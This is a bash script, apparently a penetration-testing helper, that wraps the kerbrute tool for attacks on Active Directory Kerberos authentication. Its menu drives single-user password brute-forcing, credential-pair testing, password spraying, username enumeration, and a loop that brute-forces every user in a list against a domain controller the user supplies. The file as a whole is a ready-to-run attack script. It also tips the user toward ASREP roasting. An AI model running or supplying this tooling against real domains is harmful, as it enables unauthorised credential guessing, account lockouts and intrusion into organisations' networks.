#!/bin/bash

line="\n============================================================\n"

cat << EOF
Select the operation to perform:

[1] bruteuser - Bruteforce a single user's password from a wordlist
[2] credpairs - Read username:password combos from a file
[3] passwordspray - Test a single password against a list of users
[4] userenum - Enumerate valid domain usernames via Kerberos
[5] bruteforce - Bruteforce usenames & passwords

[!] Tip: Kerbrute can lockout accounts if that setting is enabled

EOF
read mode

echo -e "\nSpecify the domain (e.g. xample.local):\n"
read dom

target=""

while getopts ":i:" option; do
	case $option in
		i)
			target="$OPTARG"
			;;
	esac
done

if [[ -z "$target" ]];
then
	echo -e "\nEnter target IP / hostname:\n"
	read target
fi

if (( mode == 1 ))
then
	echo -e "\nEnter the file path for the password wordlist:\n"
	read passwd
	echo -e "\nEnter the username to Bruteforce\n"
	read user


	kerbrute bruteuser -d $dom --dc $target "$passwd" "$user"


elif (( mode == 2 ))
then
	echo -e "\nEnter the file path for the credential wordlist (The format is username:password):\n"
	read passwd


	kerbrute bruteforce -d $dom --dc $target "$passwd"


elif (( mode == 3 ))
then
	echo -e "\nSpecify the password to spray:\n"
	read passwd

	echo -e "\nSpecify the file path to the username wordlist:\n"
	read user


	kerbrute passwordspray -d $dom --dc $target "$user" "$passwd"


elif (( mode == 4 ))
then
	echo -e "\nSpecify the file path to the username wordlist:\n"
	read user

	echo -e "$line\n[!] Tip: kerbrute performs ASREP Roasting on vuln accounts, but the hash *isn't* in a crackable format for john. ASREP Roast with Ares instead.\n$line"


	kerbrute userenum -d $dom --dc $target "$user"


elif (( mode == 5 ))
then
	echo -e "\nSpecify the file path to the username wordlist:\n"
	read user_list
	echo -e "\nEnter the file path for the password wordlist:\n"
	read passwd

	for u in $(cat $user_list)
	do

		kerbrute bruteuser -d $dom --dc $target "$passwd" "$u"

		echo -e "$line"
	done

else
	echo -e "\nYou did not select a valid option\n"
fi
echo -e "$line"
